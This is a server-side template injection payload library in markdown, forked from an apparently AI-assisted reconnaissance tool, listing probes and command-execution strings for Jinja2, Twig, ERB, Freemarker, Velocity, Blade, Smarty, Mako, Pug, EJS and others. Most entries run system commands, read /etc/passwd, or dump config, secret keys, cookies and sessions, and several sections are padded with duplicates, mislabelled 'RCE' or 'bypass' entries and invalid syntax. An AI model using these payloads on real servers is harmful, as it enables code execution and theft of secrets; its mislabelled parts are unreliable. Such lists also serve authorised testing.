<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# Full SSTI (Server-Side Template Injection) Payload Library

## Jinja2 (Python)
```
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{{request}}
{{request.application}}
{{request.cookies}}
{{request.headers}}
{{request.json}}
{{request.args}}
{{request.form}}
{{request.values}}
{{session}}
{{session.items()}}
{{url_for}}
{{get_flashed_messages()}}
{{lipsum()}}
{{lipsum(1)}}
{{lipsum(1,True)}}
{{cycler.__init__.__globals__}}
{{joiner.__init__.__globals__}}
{{namespace.__init__.__globals__}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{request.__class__.__mro__[2].__subclasses__()}}
{{request['__class__']['__mro__'][2]['__subclasses__']()}}
{{self.__class__.__bases__[0].__subclasses__()}}
{{x|join}}
{{x|escape}}
{{x|first}}
{{x|last}}
{{x|length}}
{{x|reverse}}
{{x|sort}}
{{x|map}}
{{x|select}}
{{x|reject}}
{{x|groupby}}
{{x|list}}
{{x|slice}}
{{x|round}}
{{x|tojson}}
{{x|truncate}}
{{x|striptags}}
{{x|title}}
{{x|trim}}
{{x|striptags}}
{{x|wordcount}}
{{x|wordwrap}}
{{x|float}}
{{x|int}}
{{x|string}}
{{x|list}}
{{x|abs}}
{{x|round}}
{{x|length}}
{{x|hash}}
```

### RCE via Jinja2
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{self.__class__.__bases__[0].__subclasses__()}}
{{request.application.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{request.__class__.__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()}}
{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{get_flashed_messages.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

## Twig (PHP)
```
{{7*7}}
{{7*'7'}}
{{_self}}
{{_self.env}}
{{_self.env.cache}}
{{_self.env.globals}}
{{_self.env.getTemplate('test').getSource()}}
{{_self.env.getTemplate('test').getSource()}}
{{_self.getTemplate('base.html.twig').getSource()}}
{{app}}
{{app.request}}
{{app.session}}
{{app.user}}
{{app.flashes}}
{{dump()}}
{{dump(app)}}
{{dump(_context)}}
{{include('template')}}
{{source('template')}}
```

### RCE via Twig
```
{{_self.env.getTemplate('base')->getSource()}}
{{_self.env.getTemplate('base').getCode()}}
{{app.request.attributes.get('_controller')}}
{{app.request}}
{{app.user}}
{{app.session}}
{{app.request.server.get('QUERY_STRING')}}
{{app.request.server.get('REQUEST_URI')}}
```

## ERB (Ruby)
```
<%= 7*7 %>
<%= 7*'7' %>
<%= @_controller %>
<%= @_request %>
<%= @_response %>
<%= @_view %>
<%= @_env %>
<%= params %>
<%= session %>
<%= cookies %>
<%= request.params %>
<%= request.headers %>
<%= request.body %>
<%= request.query_string %>
<%= request.uri %>
<%= request.original_url %>
<%= response.body %>
<%= response.headers %>
<%= render template: "test" %>
<%= render inline: "<%= system('id') %>" %>
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
<%= ENV.keys %>
<%= `id` %>
<%= IO.popen("id").readlines() %>
```

### RCE via ERB
```
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= spawn('id') %>
<%= IO.popen('id').read %>
<%= %x(id) %>
<%= File.open('/etc/passwd').read %>
<%= Dir.glob('*') %>
<%= Dir.entries('/') %>
<%= `ls -la` %>
<%= Process.uid %>
<%= Process.gid %>
```

## Freemarker (Java)
```
${7*7}
${7*'7'}
${.getClass()}
${.getClass()?getProtectionDomain()?getCodeSource()?getLocation()?toURI()?toURL()?getContent()}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
<#assign x=7*7>${x}
<#if true>true</#if>
<#list ["a","b","c"] as i>${i}</#list>
```

### RCE via Freemarker
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
<#assign x=7*7>${x}
${"freemarker.template.utility.Execute"?new()("id")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().toURL().getContent()}
```

## Velocity (Java)
```
#set($x=7*7)$x
#set($x=$x+1)$x
${x}
${x+1}
${x*2}
${x/2}
${x%2}
${x==7}
${true}
${false}
${null}
${"string"}
${array[0]}
${map.key}
${map['key']}
$velocityCount
$session
$request
$response
$application
```

### RCE via Velocity
```
#set($exec=$!{runtime}.getMethods())
#set($ex=$!{runtime}.exec('id'))
#set($r=$!ex.getReader())
$r.readLine()
${new java.util.Scanner(new java.io.File('/etc/passwd')).next()}
${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()}
${new java.lang.ProcessBuilder('id').start()}
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('id').getInputStream().read()}
${''.getClass().forName('java.lang.Runtime').getMethod('exec','java.lang.String').invoke(null,'id')}
```

## Blade (Laravel)
```
{{7*7}}
{{ config }}
{{ config.get('app.timezone') }}
{{ config.get('database.connections.mysql.host') }}
{{ request() }}
{{ request()->get('key') }}
{{ request()->input('key') }}
{{ app() }}
{{ app('config')->get('key') }}
{{ app('session')->get('key') }}
{{ app('request')->get('key') }}
{{ route('route.name') }}
{{ asset('js/app.js') }}
{{ storage_path('app/file.txt') }}
{{ public_path('file.txt') }}
{{ base_path() }}
{{ app_path() }}
{{ config_path() }}
{{ database_path() }}
{{ resource_path() }}
{{ view_path() }}
```

### RCE via Blade
```
{{ app('Illuminate\Support\Facades\File')->get('/etc/passwd') }}
{{ app('files')->get('/etc/passwd') }}
{{ file_get_contents('/etc/passwd') }}
{{ readfile('/etc/passwd') }}
{{ file_put_contents('/tmp/test','test') }}
```

## Django (Python)
```
{{7*7}}
{{7*'7'}}
{{request}}
{{request.user}}
{{request.GET}}
{{request.POST}}
{{request.COOKIES}}
{{request.META}}
{{request.path}}
{{request.get_host}}
{{request.get_full_path}}
{{settings}}
{{settings.SECRET_KEY}}
{{messages}}
{{user}}
{{perms}}
```

## Smarty (PHP)
```
{7*7}
{7*$x}
{$x=7}{$x}
{$smarty.version}
{$smarty.now}
{$smarty.template}
{$smarty.template_object}
{$smarty.display()}
{$smarty.fetch()}
{php}echo `id`;{/php}
```

### RCE via Smarty
```
{php}system('id');{/php}
{php}echo `id`;{/php}
{php}exec('id');{/php}
{php}passthru('id');{/php}
{php}shell_exec('id');{/php}
```

## Mako (Python)
```
<%
import os
%>
${os.popen('id').read()}
${7*7}
${'test'.upper()}
${'test'.lower()}
${request}
${session}
${g}
```

## Jade/Pug
```
- var x = 7*7
= x
- for i in range(1,10)
  = i
- include /etc/passwd
```

## Jade to RCE
```
- var exec = require('child_process').execSync('id')
= exec
```

## Handlebars (Node.js)
```
{{7*7}}
{{#if true}}yes{{/if}}
{{#each items}}{{this}}{{/each}}
{{#with object}}{{key}}{{/with}}
{{{unescaped}}}
{{helper param1 param2}}
{{lookup obj key}}
```

## EJS (Node.js)
```
<%= 7*7 %>
<%= 7*'7' %>
<%= process.cwd() %>
<%= process.version %>
<%= process.platform %>
<%= process.arch() %>
<%= process.memoryUsage() %>
<%= process.uptime() %>
<%= require('child_process').execSync('id').toString() %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= global.require('fs').readdirSync('/') %>
```

## Nunjucks (Node.js)
```
{{7*7}}
{{7*'7'}}
{{range(1,10)}}
{{#range(1,10)}}{{i}}{{/range}}
{{#each items}}{{this}}{{/each}}
{{#with obj}}{{key}}{{/with}}
{{import('fs').readdirSync('.')}}
{{require('fs').readdirSync('.')}}
```

## Template Injection Lists

### Common Injection Points
```
/search?q={{7*7}}
/profile?name={{7*7}}
/profile?name={{config}}
/profile?name={{request}}
/profile?name={{session}}
/item?id={{7*7}}
/item?id={{url_for}}
/item?id={{lipsum}}
```

### AngularJS
```
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1')}}
{{$on.constructor('alert(1)')()}}
{{toString.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}
```

### Vue.js
```
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
```

## Payloads by Context

### Simple Context
```
{{7*7}}
${7*7}
<%= 7*7 %>
{7*7}
```

### Attribute Context
```
" onmouseover="{{7*7}}"
' onmouseover='{{7*7}}'
javascript:alert({{7*7}})
```

### JavaScript Context
```
'; alert(1); //
"; alert(1); //
```

### Code Context
```
{{require('child_process').execSync('id')}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%= new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine() %>
```

## Bypass Techniques

### Encoding
```
{{7*7}}
{{7*'7'}}
{{config}}
{{request}}
```

### Filters
```
{{x|upper}}
{{x|lower}}
{{x|escape}}
{{x|length}}
```

### Chaining
```
{{x|join}}
{{x|first}}
{{x|last}}
```
